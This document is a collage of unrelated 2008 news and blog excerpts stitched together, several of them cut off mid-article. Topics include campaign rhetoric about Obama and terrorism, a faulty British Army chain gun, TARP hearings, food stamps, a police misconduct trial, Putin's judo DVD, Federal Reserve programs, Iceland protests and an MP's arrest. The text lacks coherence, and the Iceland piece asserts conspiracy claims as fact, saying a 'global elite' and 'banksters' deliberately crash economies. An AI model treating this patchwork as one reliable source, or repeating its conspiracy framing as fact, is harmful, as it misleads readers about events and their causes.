The pilot has lowered the ramp , dipped the tail end into the water to partially flood the compartment ( a maneuver that requires quite precise flying ) and awaits the Navy SEALs to board in their F470 Zodiac .
No matter what you think of this war , You have just got to LOVE the skill of our military .... easy to lose lift and ditch the whole chopper .

See also : " Obama Bin Lyin ' " sign at McCain rally .
Here 's another example , and here 's another .
And below , a snip from Frank Rich in the NYT today :
[ W ] hat has pumped up the Weimar - like rage at McCain - Palin rallies , is the violent escalation in rhetoric , especially ( though not exclusively ) by Palin .
Obama " launched his political career in the living room of a domestic terrorist . "
He is " palling around with terrorists " ( note the plural noun ) .
Obama is " not a man who sees America the way you and I see America . "
Wielding a wildly out - of - context Obama quote , Palin slurs him as an enemy of American troops .
By the time McCain asks the crowd " Who is the real Barack Obama ? " it 's no surprise that someone cries out " Terrorist ! "
The rhetorical conflation of Obama with terrorism is complete .
It is stoked further by the repeated invocation of Obama 's middle name by surrogates introducing McCain and Palin at these rallies .
This sleight of hand at once synchronizes with the poisonous Obama - is - a - Muslim e-mail blasts and shifts the brand of terrorism from Ayers 's Vietnam - era variety to the radical Islamic threats of today .
That 's a far cry from simply accusing Obama of being a guilty - by - association radical leftist .
Obama is being branded as a potential killer and an accessory to past attempts at murder .
" Barack Obama 's friend tried to kill my family " was how a McCain press release last week packaged the remembrance of a Weather Underground incident from 1970 – when Obama was 8 .
We all know what punishment fits the crime of murder , or even potential murder , if the security of post - 9/11 America is at stake .
We all know how self - appointed " patriotic " martyrs always justify taking the law into their own hands .
And a few grafs down , a reference to something we blogged about here on Boing Boing a couple of weeks ago :
No less disconcerting was a still - unexplained passage of Palin 's convention speech :
Her use of an unattributed quote praising small - town America ( as opposed to , say , Chicago and its community organizers ) from Westbrook Pegler , the mid-century Hearst columnist famous for his anti-Semitism , racism and violent rhetorical excess .
After an assassin tried to kill F.D.R. at a Florida rally and murdered Chicago 's mayor instead in 1933 , Pegler wrote that it was " regrettable that Giuseppe Zangara shot the wrong man . "
In the '60s , Pegler had a wish for Bobby Kennedy : " Some white patriot of the Southern tier will spatter his spoonful of brains in public premises before the snow falls . "

The faulty Army - issue machine gun that fires ten times a second without a finger on the trigger
A machine gun used by British soldiers in Iraq and Afghanistan suffers from a fault that can cause it to fire ten rounds a second without anyone pulling the trigger .
Internal Ministry of Defence documents - leaked to this newspaper - reveal that the Army ’s 7.62 mm chain guns , which are mounted on 800 Warrior armoured vehicles , have fired without warning at least 18 times since 1999 .
Suspicions about the gun were first raised in 2003 , when the weapon fired at Sergeant Albert Thompson of the 1st Battalion of the Black Watch in Iraq .
Trigger happy : The MoD has admitted that the 7.62 mm chain gun used by British soldiers can fire ten rounds a second without anyone pulling the trigger
He was forced to have his leg amputated below the knee and was awarded more than £ 1 million in compensation .
The MoD blamed the gunner , Captain Tam Henderson , and convicted him of negligence at a military hearing in Basra .
He was later cleared on appeal .
An internal report - or Board of Inquiry - into the Thompson incident reveals that ‘ undemanded firing ’ of the chain gun occurred on at least six other occasions from 1999 to 2004 .
It concluded that the chain gun ‘ is unpopular with many service users primarily due to a perception of reliability issues ’ .
Another report - a Munitions Incidents Summary , produced by the MoD ’s Defence Logistics Organisation - reveals that the weapon fired without warning in 2004 , killing an Iraqi civilian and severely injuring another Iraqi woman .
The MoD has admitted in an email to Mr Henderson that the weapon has fired at random 12 times this year alone .
Last night , he said : ‘ I ca n’t believe the MoD has finally admitted the gun is dangerous .
It has tried to cover up this lethal fault for years .
Why does the Government allow so many British troops to die because of poor equipment and funding ?
' I resigned my commission last year because I felt I could not lead my troops into a war knowing we were not supported . ’
Weapons expert Warren Lister , who has extensive knowledge of the chain gun ’s faults , said : ‘ The cost of correcting the fault to the chain gun would be £ 18 million , a relatively small amount compared to the total MoD budget . ’
Shadow Defence Secretary Liam
Fox said : ‘ If this is a correctable fault and nothing has been done because of the cost , then it is a scandal . ’
The news is the latest equipment row to rock the MoD. Yesterday it emerged that the commander of the SAS in Afghanistan , Major Sebastian Morley , had resigned , blaming the Government ’s failure to provide adequate kit for British troops fighting the Taliban .
An MoD spokesman said : ‘ We accept that there are instances of undemanded firing with the chain gun .
There are varying degrees of technical problems and mechanical faults .
‘ Any problems with the chain gun are investigated immediately and addressed as required .
We have confidence in the Warrior chain gun . ’
WASHINGTON , Nov 13 ( Reuters ) - Hedge fund managers , who rank among some of the world ’s shrewdest dealmakers , told Congress the U.S. government ’s bank capital injection program did not have enough strings attached .
“ The current terms are overly generous to recipients , ” said John Paulson , president of hedge fund Paulson & Co .
He was among five hedge fund managers questioned on Thursday by the U.S. House Oversight and Government Reform Committee about Treasury Secretary Henry Paulson ’s management of a $ 700 billion bailout program to unfreeze credit markets through taxpayer investments in financial firms .
John Paulson -- whose attack on the plan was dubbed “ Paulson versus Paulson ” by the lawmakers -- said any bank receiving federal funds should halt cash dividends on common stock and restrict cash compensation to executives .
He also said the government should demand a higher dividend payment from participating banks , possibly around 10 percent instead of the 5 percent rate now in place .
James Simons , a mathematics professor - turned - investor who now heads Renaissance Technologies , called the bank injections “ quite a sweet deal ” for firms requesting the funds .
John Paulson , Philip Falcone , Kenneth Griffin , George Soros and Simons were called to testify at the hearing about the role of hedge funds , their tax status and regulation .
Each executive earned , on average , more than $ 1 billion last year .
Soros , the billionaire chairman of Soros Fund Management and a prominent philanthropist , said the Treasury Department ’s execution of the program “ is not adequate or acceptable . ”
Soros , who has longtime ties to Democrats , said the Treasury Department should have made the cost of capital more expensive for participating banks .
That would give banks an incentive “ to put it to good use to get a good return by actually lending , ” he said .
The government has so far dedicated $ 250 billion for bank capital injections under the Troubled Asset Relief Program ( TARP ) .
[ ID :nN14514692 ]
The Treasury Department believes participating banks have an incentive to lend because they want a return on the capital , which is relatively cheap at a 5 percent dividend for the first five years .
The program also restricts lavish executive pay , including golden parachutes for departing executives , and forbids companies to boost dividends or buy back their own stock .
Some Democratic lawmakers have threatened to add more conditions to the capital injection program , including an outright ban on dividends and setting lending requirements .
Sen . Charles Schumer , a Democrat on the Senate Banking Committee , said on Thursday the Treasury Department should have veto power over any mergers involving banks that receive federal funds .
House Financial Services Chairman Barney Frank recently said Congress may seek to block the authorization of the program ’s remaining $ 350 billion if participating banks fail to do more lending to help jumpstart the economy .
Falcone , who runs the activist hedge fund Harbinger Capital Partners and who highlighted his humble upbringing in his testimony , said banks should receive federal capital at a cost aligned with market rates .
The contrarian view came from Griffin , whose Citadel Investment Group is facing a difficult year .
His flagship Kensington and Wellington hedge funds were down about 38 percent through early November .
Griffin said the government cannot charge market rates for its capital because those rates are too high for many firms .
The capital injections are “ in essence an indirect subsidy to the banking system ” that he said should be ultimately passed through to the consumer .
Treasury ’s Henry Paulson said on Wednesday that the government had largely abandoned its plan to buy toxic mortgage assets in favor of making direct investments in financial institutions and shoring up consumer credit markets .

Ohio is one of at least five states this year that have eased the asset test for food aid eligibility .
MORE PEOPLE GET FOOD AID MORE PEOPLE GET FOOD AID Number of people on food stamps , now called Supplemental Nutrition Assistantance Program , in millions : Source : U.S. Dept. of Agriculture .
2008 numbers reflect data through July .
As the economy weakens , states and the federal government are trying to help more people qualify for food stamps .
Since Oct. 1 , new federal rules make it easier for households with income from combat pay , retirement accounts or education savings to be eligible .
The rules are part of the 2008 Farm Bill , which changed the name of the food stamp program to SNAP , Supplemental Nutrition Assistance Program .
" This is a nutrition program , not a welfare program , " says Jean Daniel , spokeswoman for the U.S. Department of Agriculture ( USDA ) , noting that half the 29 million Americans who receive aid are children .
SNAP serves one of every five of the nation 's kids , who are also eligible for free or reduced - price school meals .
Some states are going further to expand eligibility .
Last month , California enacted a bill that will allow low - income people to keep some savings and still qualify for food aid .
At least four other states — Maryland , Ohio , Pennsylvania and Vermont — similarly eased the asset test this year .
" People wo n't have to sink to ground zero to get help , " says Paul Fraunholtz , a deputy director in Ohio's Department of Job and Family Services .
The U.S. government pays for the benefit , and states cover half the cost of administering the program , which began in 1961 .
States are allowed to adjust eligibility rules , and more are doing so .
As of Oct. 1 , Washington state allowed people with slightly higher incomes , up to $ 42,400 for a family of four , to qualify .
New York began giving energy aid to more low - income renters , because receiving such aid increases their monthly food stamp benefit .
" States are looking for new ways to support working families , " says Stacy Dean , director of food assistance policy at the Center on Budget and Policy Priorities , which studies policies that affect low - and moderate - income people .
She says more states , faced with tight budgets , are making changes this year to increase federal food aid .
SNAP : Find out more about food aid eligibility Dean says the changes will increase participation but job layoffs will do far more to add people to the program .
She says states and the USDA are encouraging eligible people to seek benefits .
Currently , two - thirds of them do .
" This is not your father 's food stamp program , " says Heidi Tringe , policy adviser to Vermont 's Republican Gov. Jim Douglas .
Recipients no longer get vouchers ; they get debit cards .
She says many people are worried about food and energy bills this winter , so expanding food aid is " the right thing to do . "

New Greenhouse Gas Sensor Will Be Cheap , Tiny , and Effective
October 29th , 2008 by Ariel Schwartz
Good news for governments looking to measure greenhouse gas emissions : a new sensor being developed by the VTT Technical Research Institute will be tiny ( less than an inch ) , cost - effective , and twice as sensitive as current sensors .
The European Union is funding the € 2.8 million MINIGAS consortium , which has brought together numerous organizations , including Finland via Gasera , the Loffe Institute in Russia , and QinetQ .
In addition to providing greenhouse gas detection , the MINIGAS sensor will also be able to detect explosive vapors and nerve gases — so governments will have multiple incentives to install the device .
Environmentally conscious consumers may also want to get in on the action , since the sensor could lead to improved air - conditioning systems in buildings .
The MINIGAS project has n’t given a release date for the sensor , but the sooner we can more accurately gauge our greenhouse emissions , the better .

LONDON ( Reuters ) - A British police officer who admitted having sex with one woman while on duty and propositioning another after she had been arrested was jailed for four months on Friday .
Police constable Gary Bayldon , 48 , who was married at the time , visited one woman for sex while working late shifts , calling the sessions “ his meal break , ” Kingston Crown Court heard .
He also asked a second woman to go the woods with him and caressed her hands while taking her fingerprints at the police station , the Press Association reported .
The court heard that Bayldon began a relationship with 34 - year - old Donna Cacutt after she called police to her home on the Isle of Wight when a man tried to take one of her children down the road .
He was the officer sent to the scene .
Prosecutor Barry Gregory said Bayldon began to see Cacutt regularly , at about the time his 20 - year marriage was breaking down , but always when he was on duty .
“ He would visit her at her home , she would make him dinner and then they would have sex afterwards , ” Gregory said .
“ He would stay for an hour or so .
He would call it his meal break . ”
The relationship lasted for a year until September 2005 but ended with “ some acrimony . ”
Bayldon met the second woman , mother - of - two Suzanne Dunkling , 37 , after being called out to a domestic incident involving her boyfriend at her home in October 2005 .
She was arrested and taken to the police station by Bayldon who told her he thought she was “ gorgeous , ” the court heard .
Gregory said Bayldon stroked and caressed her hand as he took her fingerprints and later invited her to a forest “ for a chat ” when he gave her a lift home in a police van .
“ She said ‘ no ’ because she knew full well he wanted her to go there for sex , ” Gregory said , adding that the police officer did kiss her , leaving her feeling “ disgusted . ”
Bayldon ’s lawyer Michael Boardman said his client had visited Cacutt during permitted breaks and had always kept his radio on so he could answer calls .
He said the officer would pay for his “ errors of judgment ” for the rest of his life .
Bayldon , from Newport on the Isle of Wight , pleaded guilty to three counts of willful misconduct in public office .
He has since resigned his post with Hampshire Constabulary where he had served for more than 18 years .
“ You as a police officer have very considerable power and the respect of the community you serve in , ” Judge Charles Tilling said .
“ People look up to you .
You abused that trust . ”
He has been accused of crushing political opponents , bullying the neighbours , and - in the words of one British diplomat appalled by Russia 's heavy - handed treatment of the British Council - of " punching a librarian " .
But Russia 's gladiatorial prime minister Vladimir Putin also has another way of dispensing with his enemies : he chucks them on a mat .
On Tuesday - his 56th birthday - Putin presented an educational judo DVD for budding students of the sport .
Its title : Let 's Learn Judo with Vladimir Putin .
Putin , a black belt , has already co-authored a book on judo , which he mastered while growing up in a gritty neighbourhood of Soviet Leningrad .
He has now taken his passion for the martial art a step further , starring in a 75 - minute training video filmed over the past 18 months in Moscow and St Petersburg .
The film shows a white - robed Putin performing a series of dashing throws .
At one point he can be seen dancing balletically with a practice partner , who lands on the ground with a satisfying thwack .
( Russian TV viewers who saw clips on Tuesday also saw Putin perform an intriguing hip wiggle . )
More than this though , Russia 's former president talks enigmatically about the philosophy behind the sport .
Addressing the camera , and with oriental music jangling in the background , Putin declares : " In a bout concessions are permissible but only in one case : if it is for victory . "
Putin is wearing black ; for a moment you could be forgiven for thinking you 're watching a Russian version of The Matrix .
Putin 's former judo trainer , Anatoli Rakhlin , says his pupil was a gifted student who has popularised the martial art in Russia .
" It 's important that our prime minister is a sportsman and not a drunk , " he adds , before shedding light on Putin 's mystical commentary : " Victory is an integral part of judo .
It goes back to when a Japanese master looked at a cherry tree laden with snow .
The branches bent - but then flung the snow off .
It 's about giving and then winning . "
Putin 's sporting prowess has been a hard act to follow for his presidential successor , Dmitry Medvedev , who is known to prefer yoga .
In August , however , Medvedev sent Russian tanks rolling into the mountains of Georgia , putting an end to questions about his macho credentials .
In any case , Putin is not short of old judo pals to spar with : his long - time friend and judo partner Vasily Shestakov is now an MP in Russia 's Duma
TALF Announcement
For release at 8:15 a.m. EST
The Federal Reserve Board on Tuesday announced the creation of the Term Asset - Backed Securities Loan Facility ( TALF ) , a facility that will help market participants meet the credit needs of households and small businesses by supporting the issuance of asset - backed securities ( ABS ) collateralized by student loans , auto loans , credit card loans , and loans guaranteed by the Small Business Administration ( SBA ) .
Under the TALF , the Federal Reserve Bank of New York ( FRBNY ) will lend up to $ 200 billion on a non-recourse basis to holders of certain AAA - rated ABS backed by newly and recently originated consumer and small business loans .
The FRBNY will lend an amount equal to the market value of the ABS less a haircut and will be secured at all times by the ABS .
The U.S. Treasury Department -- under the Troubled Assets Relief Program ( TARP ) of the Emergency Economic Stabilization Act of 2008 - - will provide $ 20 billion of credit protection to the FRBNY in connection with the TALF .
The attached terms and conditions document describes the basic terms and operational details of the facility .
The terms and conditions are subject to change based on discussions with market participants in the coming weeks .
New issuance of ABS declined precipitously in September and came to a halt in October .
At the same time , interest rate spreads on AAA - rated tranches of ABS soared to levels well outside the range of historical experience , reflecting unusually high risk premiums .
The ABS markets historically have funded a substantial share of consumer credit and SBA - guaranteed small business loans .
Continued disruption of these markets could significantly limit the availability of credit to households and small businesses and thereby contribute to further weakening of U.S. economic activity .
The TALF is designed to increase credit availability and support economic activity by facilitating renewed issuance of consumer and small business ABS at more normal interest rate spreads .

GSE Announcement
The Federal Reserve announced on Tuesday that it will initiate a program to purchase the direct obligations of housing - related government - sponsored enterprises ( GSEs ) -- Fannie Mae , Freddie Mac , and the Federal Home Loan Banks -- and mortgage - backed securities ( MBS ) backed by Fannie Mae , Freddie Mac , and Ginnie Mae .
Spreads of rates on GSE debt and on GSE - guaranteed mortgages have widened appreciably of late .
This action is being taken to reduce the cost and increase the availability of credit for the purchase of houses , which in turn should support housing markets and foster improved conditions in financial markets more generally .
Purchases of up to $ 100 billion in GSE direct obligations under the program will be conducted with the Federal Reserve 's primary dealers through a series of competitive auctions and will begin next week .
Purchases of up to $ 500 billion in MBS will be conducted by asset managers selected via a competitive process with a goal of beginning these purchases before year - end .
Purchases of both direct obligations and MBS are expected to take place over several quarters .
Further information regarding the operational details of this program will be provided after consultation with market participants .
The new report shows that there are far more companies to track than previously known , with backgrounds that are far more varied than earlier disclosures had suggested .
And research by the federal investigators indicates that more than five years into the conflict , there is still no central database to account for all the security companies in Iraq financed by American money .
The investigators pieced together information from individual rosters at the Pentagon , the State Department and the United States Agency for International Development , as well as several independent federal databases that track procurement and contractors .
The agencies alerted investigators that none of their repositories of information were believed to be 100 percent accurate .
Indeed , the Pentagon disputed some of the inspector general ’s findings , saying it could confirm only 77 of the entries , involving about $ 5.3 billion in contracts .
But by using the overlapping if incomplete databases , the investigators say they have determined that at least another 233 companies shared $ 662 million in additional work for guards , escorts and possibly less dangerous work like computer security .
Because all of the databases are incomplete , estimates of the number of security companies and the money spent on their contracts are likely to grow , the report indicates .
None of the handful of companies contacted by The Times denied having received security contracts in Iraq .
David Westrate , a senior vice president at MVM Inc. , an American security company ranked 16th in terms of the amount of money it had been paid to provide security in Iraq  about $ 38 million on 21 separate Pentagon contracts  said , “ We can not confirm the numbers as you ’ve given them to us , but I ’m not surprised that we ’re in the top 20 . ”
Perhaps the most eye - opening aspect of the list is the variety in the types of companies listed .
Agility Logistics , formerly called Public Warehousing Company , is widely known as a colossus in the business of delivering food and other supplies to troops in Iraq .
Police forensics specialists were working around the body much of the day .
The local coroner was also at the scene .
A funeral home car and two police officers on all - terrain vehicles removed the body from the bush just before 5 p.m .
The body has been taken to Toronto where a post mortem examination will take place , OPP Const .
George Silvestri said .
Provincial police have taken over the investigation .

Icelanders attack police headquaters in Reykjavik .
In October , the CBC reported on the “ exceedingly polite protest ” in Iceland as the bankers looted the country .
A placard at a demo outside of Iceland ’s parliament in Reykjavik stated : “ Stay calm while we rob you . ” CBC asked : “ How long will these people stay polite about their losses ? ”
It now appears they are no longer polite , even for Icelanders .
Last Saturday , protesters angry over the 50 percent devaluation of the Krona and the impending third worldization of their small country clashed with police .
“ Police clashed with hundreds of protesters outside a police building Saturday , and several demonstrators were sent to the hospital with injuries , ” reported the Associated Press .
“ Police used pepper spray after protesters tried to break down a door of the police building in the Icelandic capital .
The demonstrators demanded that a fellow protester being held by police since Friday be allowed to go home . ”
According to the Associated Press , the “ demonstrators blame the government for having failed to adequately oversee the banking industry . ”
In fact , many Icelanders blame the government not for overseeing the banking industry but working in a cahoots with it to loot the country .
Iceland ’s politicos are no different than their counterparts in Europe and the United States : they are sock puppets for the global elite who are determined to crash the global economy country by country and buy up goodies for pennies on the dollar .
A d v e r t i s e m e n t
Iceland is a test case for things to come .
In the months ahead , the banksters and their political minions will take down fragile economies in Hungary , the Baltic States , and other Eastern European nations , followed soon enough in western Europe and the United States .
Iceland is in the process of begging for assistance from the globalist loan sharking operation , the International Monetary Fund , thus setting itself up to be looted further .
“ We are ready to answer any demand by countries facing problems , ” declared the IMF ’s boss , Dominique Strauss - Kahn .
“ An IMF intervention in Iceland , which would necessarily involve accepting a series of harsh measures to restore fiscal and monetary stability , would underline the extraordinary reversal in the country ’s fortunes after a decade - long , debt - fueled binge by the country ’s banks , businesses and some private citizens , ” the International Herald Tribune reported on October 9 .

Ari observes that Sarah Palin refused to acknowledge the existence of right - wing domestic terrorists in her NBC interview that aired last night :
Brian Williams : Back to the notion of terrorists and terrorism , this word has come up in relation to Mr. Ayers -- hanging out with terrorist – domestic terrorists .
It is said that it gives it a vaguely post uh 9 - 11 hint , using that word , that we do n’t normally associate with domestic crimes .
Are we changing the definition ?
Are the people who set fire to American cities during the ‘ 60 ’s terrorists , under this definition ?
Is an abortion clinic bomber a terrorist under the definition ?
Sarah Palin :
There is no question that Bill Ayers via his own admittance was um one who sought to destroy our US Capitol and our Pentagon -- that is a domestic terrorist .
There ’s no question there .
Now others who would want to engage in harming innocent Americans or um facilities , that uh , it would be unacceptable -- I do n’t know if you could use the word terrorist , but its unacceptable and it would not be condoned of course on our watch .
I do n’t know if what you are asking is if I regret referring to Bill Ayers as an unrepentant domestic terrorist .
I do n’t regret characterizing him as that .
Williams : I ’m just asking what other categories you would put in there .
Abortion clinic bombers ?
Protesters in cities where fires were started , Molotov cocktails , were thrown ?
People died .
Palin : I would put in that category of Bill Ayers anyone else who would seek to destroy our United States Capitol and our Pentagon and would seek to destroy innocent Americans .
Well , just in case Mrs. Palin forgot , there was a running spate of domestic terrorism in the United States in the 1990s created by the far - right " Patriot " movement , much of it revolving around abortion and hatred of the federal government .
The signature event , of course , was the bombing of the Murrah Building in Oklahoma City in 1995 .
But that was hardly the end of it .
Indeed , by the end of 1999 , we were able to document over 40 such cases -- many of which were nipped in the bud before they reached fruition .
Some were not .
It seems Palin needs a refresher course .
The Jed Report video above mentions two abortion - clinic shooters , Paul Hill and Michael Griffin , who were among the murderous terrorists who inspired the federal law that protects abortion providers -- a law John McCain twice voted against .
But that was hardly all .
Below , a rundown of other significant domestic terrorists :
Eric Rudolph :
Eric Robert Rudolph ( born September 19 , 1966 ) , also known as the Olympic Park Bomber , is an American radical described by the FBI as a terrorist who committed a series of bombings across the southern United States which killed two people and injured at least 150 others .
Rudolph declared that his bombings were part of a guerrilla campaign against abortion and what he describes as " the homosexual agenda . "
He spent years as the FBI 's most wanted criminal fugitive , but was eventually caught .
In 2005 Rudolph pleaded guilty to numerous federal and state homicide charges and accepted five consecutive life sentences in exchange for avoiding a trial and the death penalty .
Rudolph was connected with the white supremacist Christian Identity movement .
Although he has denied that his crimes were religiously or racially motivated , Rudolph has also called himself a Roman Catholic in " the war to end this holocaust " ( of abortion ) .
James Kopp :
James Charles Kopp ( born August 2 , 1954 ) is an American citizen who was convicted in 2003 for the 1998 sniper - style murder of Dr. Barnett Slepian , an Amherst , New York physician who performed abortions .
Prior to his capture , Kopp was on the FBI 's list of Ten Most Wanted Fugitives .
On June 7 , 1999 he had become the 455th fugitive placed on the list by the FBI .
He was affiliated with anti-abortion group " The Lambs of Christ . "
He has been referred to as a terrorist by the National Memorial Institute for the Prevention of Terrorism .
The Phineas Priesthood :
Letters left at the scene of an April 1996 bank robbery / clinic bombing in Spokane , Washington , contained Identity propaganda , diatribes against the banking system and were signed with the symbol of the " Phineas Priesthood . "
[ At the time of the robbery , a bomb was set off at a nearby Planned Parenthood clinic as a diversion , with death threats toward abortion providers contained in the note left with that bomb . ]
The three men arrested , Charles Barbee , Robert Berry and Jay Merrell , were linked to white supremacist and " Identity " groups and were also charged with setting off bombs at a newspaper office and a Planned Parenthood clinic .
All three were convicted .
[ More here . ]
Tim McVeigh :
Timothy James McVeigh ( April 23 , 1968 – June 11 , 2001 ) was a United States Army veteran and security guard who bombed the Alfred P. Murrah Building in Oklahoma City on the second anniversary of the Waco Siege , as revenge against what he considered to be a tyrannical federal government .
The bombing killed 168 people , and was the deadliest act of terrorism within the United States prior to the September 11 , 2001 attacks .
Buford Furrow :
Buford O'Neal Furrow , Jr. ( born November 25 , 1961 ) perpetrated the August 1999 Los Angeles Jewish Community Center shooting on August 10 , 1999 , when he attacked a day care center at the North Valley Jewish Community Center .
The shooting injured three children , and a receptionist .
He also shot dead US Postal Service carrier Joseph Ileto who was Filipino American .
Furrow was a member of the white - supremacist group Aryan Nations in 1995 .
On January 24 , 2001 Furrow pleaded guilty all of the counts against him .
In exchange for pleading guilty , Furrow avoided a possible death sentence , but was instead sentenced to life in prison without the possibility of parole .
According to the indictment , Furrow expressed no regrets for any of his crimes .
This is just a sampling .
There were many more such cases in which clinics were bombed , government officials and offices threatened or attacked .
These activities slowed considerably in the past eight years , but continue to bubble along .
There was , for instance , the case of Demetrius " Van " Crocker , who was caught trying to buy explosives he planned to bomb Congress with .
Or William Krar , who put together a cyanide bomb he planned to set off in a public venue .
Or Chad Castagana , the self - described Coulter / Malkin worshipper who sent various liberal figures fake anthrax threats .
There have been many others .
And they have n't gone away .
As recently as last year , bombs were being left at an abortion clinic in Houston , and Alabama militiamen were being arrested for plotting to commit a massacre of Latino immigrants .
But we understand why Sarah Palin may not want to acknowledge the existence of this kind of domestic terrorist .
After all , every one of them proceeded out of the ranks of the far - right " Patriot " movement .
The very movement whose members she " palled around with " in Wasilla -- and indeed empowered them at every turn .
NEW YORK ( CNNMoney.com ) --
Here 's the challenge facing President - elect Barack Obama as he weighs how to create more jobs : another half - million jobs likely will be lost between now and Inauguration Day .
That 's not even counting the 200,000 jobs that economists believe employers trimmed last month , according to estimates from Briefing.com .
The October jobs report will be released this Friday .
The unemployment rate is expected to climb to 6.3 % from 6.1 % and match the worst reading of the decade .
And economists all seem to agree the worst is yet to come .
At some point next year the unemployment rate is forecast to pass 7 % , a level not seen since 1993 .
And monthly job losses of 200,000 or more are expected to become the norm , not the exception , as the full impact of the credit crisis is felt more keenly on Main Street .
Economists generally believe there 's little Obama can do to stop more job losses in the short - term , even if he 's able to get a new economic stimulus package passed by the lame - duck Congress and signed into law by President Bush .
" Superman could n't change what 's in store for the U.S. economy .
It 's going to be ugly , " said Rich Yamarone , director of economic research at Argus Research .
Andrew Reina , a practice director for the staffing firm Ajilon Finance Solutions , said caution has become the watchword for companies making hiring decisions because of uncertainty about business conditions .
Even if they are n't cutting jobs , they 're likely leaving more positions open this year and could push back hiring plans for 2009 until later in the year .
Reina agrees that President - elect Obama wo n't be able to change that outlook in the near term .
" It 's an uphill battle .
He 's going to have a lot of work on his hands early on , " he said .
Big
Three eyes help to save jobs
One of the immediate questions facing the Obama administration is what help , if any , to extend to the battered U.S. automakers , who may seek the same kind of financial help that banks and Wall Street firms have received recently .
General Motors ( GM , Fortune 500 ) issued a statement Wednesday suggesting it is looking forward to that kind of help from that the new administration .
" GM welcomes President - elect Obama 's pledge to support our nation 's domestic auto industry in its ongoing efforts to transform its business and develop new technologies , " the company said .
" This support will enable a competitive U.S. industry to contribute significantly to our nation 's economic revival . "
The Center for Automotive Research , a Michigan think tank , issued a study Wednesday that showed 2.5 million jobs could be lost in the next year if GM , Ford Motor ( F , Fortune 500 ) and Chrysler were forced by the downturn to shutdown half of their U.S. plants .
" To permit any of the Detroit Three manufacturers to collapse would scar the U.S. economy further at a time when it can ill afford another blow , " said David Cole , CAR 's chairman .
" The likelihood of one or two of the Detroit Three manufacturers ending operations is very real . "
But many of those plants could be lost even if government help is made available , especially if auto sales stay weak and credit to car buyers and dealers remain tight .
Along those lines , experts say that worries about the economy , not necessarily policy changes from Obama , will keep employers from adding staff .
Even those who expect some kind of stimulus plan getting past Congress say more job losses are already certain .
" I think businesses are going to do what they 're going to do , regardless of government policy , at least over the next six months , " said Mark Zandi , chief economist of Moody 's Economy.com , who forecasts job losses between 150,000 and 200,000 a month over the next six months .
Recovery not likely until 2010
Another economist suggested that the positive effects from a stimulus package would not be felt until spring or early summer 2009 at the earliest and that there would be no significant job gains until 2010 .
" Classically , employment is a lagging indicator that will decline well into the recovery period , " Brian Bethune chief U.S. financial economist for research firm Global Insight .
" Assuming the recession lasts until middle of 2009 , it may be another six to eight beyond that before employment stabilizes . "
This does n't mean that Obama is powerless to help create jobs for the longer - term .
And economists say things could be worse if the new administration makes the wrong decisions .
Mark Vitner , senior economist with Wachovia , said unemployment could rise as high as 8.5 % in the first quarter of 2010 if Congress does approve help for state and local governments and move ahead on public works projects as part of a stimulus package .
Vitner also is worried that employers will pull back on hiring even more if they sense that an Obama administration will make it easier for unions to organize non-union companies .
But he does n't believe either Obama or the congressional Democrats will actually push an anti-business agenda .
Much of the current job weakness stems from credit tightening , which makes it more difficult for large and small businesses to get the financing they need to expand and hire more workers .
But Vitner said there is relatively little that either Obama or the current Bush administration will be able to do to get banks and Wall Street firms lending again , despite talk about pushing financial institutions to use the $ 700 billion in federal help to start making loans .
" Banks will continue to tighten until we see an improvement in credit quality .
That 's 18 months to two years away , " Vitner said .
" The credit cycle has to play out .
You ca n't legislate lending . "

The Lib Dems have called shadow immigration minister Damian Green 's arrest a " mayday warning " for democracy amid cross -party anger over the move .
Mr Green was arrested , held for nine hours and had his two homes and offices searched by police investigating alleged leaks from the Home Office .
Tory leader David Cameron called the police operation " alarming " and said the government had questions to answer .
But the Home Office said ministers were not informed until after the arrest .
' Democracy in danger ' Mr Cameron , London Mayor Boris Johnson and Commons Speaker Michael Martin were all informed about the raids .
But Downing Street insisted ministers had not been given advance warning and Prime Minister Gordon Brown said it was purely a police matter .
" I had no prior knowledge , the home secretary had no prior knowledge , I know of no other minister who had any prior knowledge , " he told Sky News , adding : " I knew about it only after it had happened . "
But the former Conservative Home Secretary and Tory leader , Michael Howard , said he would be " astonished " if he had not been told about the police investigation when in office .
The decision to make today 's arrest was taken solely by the MPS without any ministerial knowledge or approval
Metropolitan Police
Q&A : Damian Green arrested Nick Robinson 's view " I would have expected to be told .
This was an investigation we know initiated by the Home Office .
Are we to believe that nobody in the Home Office was told ? "
He added : " If nobody knew it tells you something about the way government is working at the present time , and about the relations between ministers and senior civil servants . "
Mr Green was not charged with any offence but was released on bail until February , when he could face further questioning .
The Ashford MP , the Tories ' immigration spokesman since 2005 , has denied any wrongdoing and said " opposition politicians have a duty to hold the government to account " .
Lib Dem leader Nick Clegg told the BBC that he was " really shocked " by Mr Green 's arrest .

" This is something you might expect from a tin - pot dictatorship , not in a modern democracy , " he said .
Given the culture of " extraordinary secrecy " in Whitehall , it was getting harder to hold the government to account and opposition MPs had a constitutional duty to keep " ministers on their toes " , he added .
He called on Gordon Brown to " rule out any further use of anti-terrorism powers in cases that have nothing to do with terrorism , " although the Metropolitan Police stressed the arrest was made under the Police and Criminal Evidence Act and not anti-terror legislation .
The Met said some counter - terrorism officers were involved because they were the most " appropriate " to carry out such an operation .
But David Cameron attacked the " heavy - handed " way in which it took nine officers to make the arrest and search the premises .
" If they wanted to talk to Damian Green why not pick up the telephone and ask to talk to him , " he said .
" I think this is extraordinary that it was so heavy - handed and done in this way , " said Mr Cameron .
" They have got questions to answer , frankly , I think government ministers have got questions to answer as well .
If they did n't know , why were n't they told ?
" What do they think about in Britain today , counter - terrorism police are spending their time searching an MP 's office , arresting him , holding him for nine hours , all on a day when British citizens are being killed on the other side of the world and all because , as far as I can see , he made public some information that was in the public interest that the government found uncomfortable .
" Well , let 's hope that our democracy has n't come to that . "

Shadow Home Secretary Dominic
Grieve released a list of more than 50 questions he said the government had to answer about the arrest , including when ministers and officials were told about it .
" The government 's limp and confused response begs more questions than it answers .
Ministers have some very important questions to answer . "
Leaks Sir David Normington , the top civil servant at the Home Office , said he had taken the decision to ask for police help in identifying the source of a series of " leaks of sensitive information over an extended period , " because the leaks had " risked undermining the effective operation of my department " .
" The police investigation led to a junior member of the Home Office being arrested on 19 November and subsequently suspended from duty , " said Sir David in a statement .
I am not sure this is good for British democracy
Denns MacShane
Labour MP " Yesterday ( Thursday ) , I was informed by the Metropolitan Police at about 1.45 pm that a search was about to be conducted of the home and offices of a member of the Opposition front bench .
I was subsequently told that an arrest had been made .
" Ministers were not involved in the decision to seek police assistance or in the subsequent investigation and were only told of the arrest after it had occurred . "
